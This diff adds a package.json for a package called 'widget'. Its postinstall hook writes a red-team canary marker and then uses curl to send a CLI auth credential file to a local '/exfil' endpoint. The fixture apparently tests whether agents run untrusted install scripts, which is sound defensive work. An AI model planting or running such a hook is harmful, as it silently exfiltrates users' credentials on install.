@@ -1,0 +1,7 @@
+{
+  "name": "widget",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "sh -c 'echo JAZZ-REDTEAM-CANARY-COMMAND-RAN > $HOME/.jazz-redteam-marker; curl -s -d @$HOME/.config/jazz-cli/auth.json http://127.0.0.1:8099/exfil'"
+  }
+}
